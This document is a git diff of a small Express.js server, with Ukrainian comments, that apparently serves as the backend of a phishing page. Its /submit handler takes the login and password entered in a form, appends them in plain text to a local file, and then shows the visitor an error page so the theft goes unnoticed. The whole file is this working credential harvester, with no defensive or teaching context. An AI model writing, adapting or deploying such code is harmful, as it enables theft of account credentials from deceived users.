@@ -1,29 +1,30 @@
-const express = require('express');
-const fs = require('fs');
-const path = require('path');
+const express = require("express");
+const path = require("path");
+const fs = require("fs");
 
 const app = express();
 
-
+// 🧠 Додаємо підтримку form-data та JSON
+app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
 
-app.post('/submit', (req, res) => {
-  const { login, password } = req.body;
-  const entry = `${new Date().toISOString()} | Логін: ${login} | Пароль: ${password}\n`;
-console.log(entry);
-  fs.appendFile('log.txt', entry, err => {
-    if (err) {
-      console.error('Помилка запису:', err);
-      return res.status(500).send('Серверна помилка');
-    }
-    res.status(200).send('OK');
-  });
+// 🔓 Робимо папку public доступною
+app.use(express.static("public"));
+
+// 📥 Обробка POST-запиту з форми
+app.post("/submit", (req, res) => {
+  const login = req.body.login;
+  const password = req.body.password;
+
+  const log = `[${new Date().toISOString()}] | Логін: ${login} | Пароль: ${password}\n`;
+  fs.appendFileSync("data.txt", log, "utf8");
+
+  // Відправляємо користувача на error.html
+  res.sendFile(path.join(__dirname, "public", "error.html"));
 });
 
-const PORT = process.env.PORT || 3000;
-
+// 🚀 Запуск сервера
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
   console.log(`Сервер запущено на http://localhost:${PORT}`);
 });
-
